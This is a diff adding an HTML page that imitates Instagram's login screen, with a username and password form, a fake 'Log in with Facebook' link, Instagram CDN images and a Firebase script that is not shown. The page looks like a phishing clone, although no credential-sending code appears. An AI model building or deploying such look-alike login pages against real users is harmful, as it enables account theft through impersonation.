@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favi.webp" type="image/x-icon">
+    <title>Login • Instagram</title>
+</head>
+<body>
+    <div class="main">
+      <div class="logo"><a href="index.html">
+        <img src="Logo-Instagram.png" alt="" >
+
+      </a>
+      </div>
+      <form action="error.html">
+        <input type="text" name="" class="inp" id="email" placeholder="Phone number, username or email">
+        <input type="password" name="" class="inp" id="pass" placeholder="Passowrd">
+        <a href="error.html">
+
+          <input type="submit" value="Log in" id="submit" class="submit" >
+        </a>
+      </form>
+      <div class="lines">
+        <span class="line"></span>
+        <span id="or">OR</span>
+        <span class="line"></span>
+      </div>
+      <div class="fb">
+        <i><img src="fblofo.png" alt="" width="15px"></i>
+        <a href="fbAuth.html">
+          <span id="logfb">Log in with Facebook</span>
+        </a>
+      </div>
+      <div id="Forgot">Forgot password?</div>
+      
+      
+    </div>
+    <div class="main sgn">
+      <span>Don't have an account?</span>
+      <span class="sign">Sign up</span>
+    </div>
+    <div class="main get">
+      <span>Get the app.</span>
+      <div class="play">
+        <img id="google" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="">
+        <img id="micro" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="">
+      </div>
+      <!-- <img src="bottom.png" alt=""> -->
+    </div>
+    <div id="meta" style="cursor: pointer;">Meta
+      About
+      Blog
+      Jobs
+      Help
+      API
+      Privacy
+      Terms
+      Top Accounts
+      Locations
+      Instagram Lite
+      Threads 
+      Contact Uploading & Non-Users
+      Rudraksh Verified
+     </div>
+
+<script>
+var email = document.getElementById('email').value;
+var pass = document.getElementById('pass');
+var inpEmail = document.getElementById("email");
+var submit = document.getElementById('submit');
+
+
+
+
+pass.addEventListener('input', function() {
+  var passvalue = pass.value;
+   
+  
+  if (passvalue.length >= 6) {
+    submit.classList.toggle = 'subTog';
+      submit.removeAttribute('disabled');
+    } else {
+      submit.setAttribute('disabled', 'true');
+    }
+
+      
+})
+
+</script>
+<script type="module" src="firebase.js"></script>
+</body>
+</html>
